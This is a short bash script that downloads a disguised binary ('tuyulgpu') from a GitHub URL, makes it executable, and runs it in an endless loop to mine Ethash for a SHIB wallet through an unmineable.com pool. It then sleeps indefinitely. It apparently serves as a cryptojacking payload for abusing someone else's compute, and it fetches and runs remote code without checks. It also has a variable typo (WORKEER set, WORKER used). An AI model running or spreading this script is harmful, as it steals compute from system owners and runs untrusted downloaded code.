#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0x37c76c96067b6f37428840b1b4461f14405d56b3
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-teady#pr1d-5r70)

wget https://github.com/Nizz776/Nizz776/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
